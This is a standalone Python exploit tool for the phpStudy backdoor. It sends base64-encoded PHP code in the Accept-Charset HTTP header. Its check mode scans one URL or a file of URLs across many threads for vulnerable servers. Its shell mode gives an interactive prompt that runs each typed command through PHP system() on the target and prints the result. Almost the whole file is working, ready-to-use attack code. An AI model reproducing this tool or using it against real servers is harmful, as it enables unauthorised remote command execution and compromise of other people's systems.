#!/usr/bin/env python3
# encoding:utf8
import base64
import requests
import sys
import re
import optparse
import threadpool
requests.packages.urllib3.disable_warnings()


__prog__ = 'phpstudy.py'
__version__ = '1.0'
__author__ = 'whois'

purp   = '\033[95m'
blue   = '\033[94m'
red    = '\033[31m'
yellow = '\033[93m'
end    = '\033[0m'


banner = red + """
______ _               _             _       
| ___ \ |             | |           | |      
| |_/ / |__  _ __  ___| |_ _   _  __| |_   _ 
|  __/| '_ \| '_ \/ __| __| | | |/ _` | | | |
| |   | | | | |_) \__ \ |_| |_| | (_| | |_| |
\_|   |_| |_| .__/|___/\__|\__,_|\__,_|\__, |
            | |                         __/ |
            |_|                        |___/
""" + yellow + """          
                                Code by whois""" + end


def check(url):
    payload = base64.b64encode("echo 13812345432;".encode('utf-8'))

    headers = {
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'MMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'accept-charset': payload,
        'Accept-Encoding': 'gzip,deflate',
        'Connection': 'close',
    }

    try:
        r = requests.get(url, headers=headers, verify=False, timeout=15)
        if '13812345432' in r.text:
            print(red + '[+] Vulnerability' + blue + ': {0}'.format(url))
    except:
        # print(yellow + "[-] Timeout" + end)
        pass



def shell(url):
    while True:
        cmd = input(blue + "[" + red + "shell" + blue + " >> ")

        if cmd == "exit":
            exit(1)

        payload = base64.b64encode("echo 13812345432;echo system('{0}');echo 13812345432;".format(cmd).encode('utf-8'))

    
        headers = {
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'accept-charset': payload,
            'Accept-Encoding': 'gzip,deflate',
            'Connection': 'close',
        }
 
        try:
            r = requests.get(url, headers=headers, verify=False, timeout=15)
            rer = re.findall("13812345432(.*?)13812345432", r.text, re.S)
            print(''.join(rer))
        except:
            print("[-] Timeout")
            exit(1)


def main():

    parser = optparse.OptionParser(
        usage="Usage: %prog [options]",
        version="{0}: v{1} ({2})".format(__prog__, __version__, __author__),
        epilog=yellow + """[#] Check URL : python3 phpstudy.py -u http://1.1.1.1/index.php --check
                  [#] Check URLS: python3 phpstudy.py -f urls.txt -t 10 --check
                  [#] Exploit   : python3 phpstudy.py -u http://1.1.1.1/index.php --shell""" + end,
    )

    parser.add_option("-u", "--url", dest="url",
            help="Target url")

    parser.add_option("-f", "--file", dest="file",
            help="Target file")

    parser.add_option("-t", "--thread", dest="thread", type='int', 
            help="Specify threads default 8")

    parser.add_option("--check", dest="check", action="store_true", default=False,
            help="Check phpstudy backdoor")

    parser.add_option("--shell", dest="shell", action="store_true", default=False,
            help="Execute Command")


    (options, args) = parser.parse_args()

    if options.url == None and options.file == None:
        print(banner)
        parser.print_help()
        exit(1) 

    if not options.check and not options.shell:
        print(banner)
        print("\n[x] Please choose mode (--check or --shell) !")
        exit(1)

    THREAD = [8 if options.thread == None else options.thread]

    if options.check:
        if options.url:
            check(options.url)

        if options.file:
            print("[*] Check urls with {0} threads".format(THREAD))
            with open(options.file, 'r') as f:
                lines = f.read().splitlines()
                pool = threadpool.ThreadPool(THREAD[0])
                rr = threadpool.makeRequests(check, lines)
                [ pool.putRequest(req) for req in rr ]
                pool.wait() 
        else:
            exit(1)

    if options.shell:

        shell(options.url)


if __name__ == '__main__':
    main()


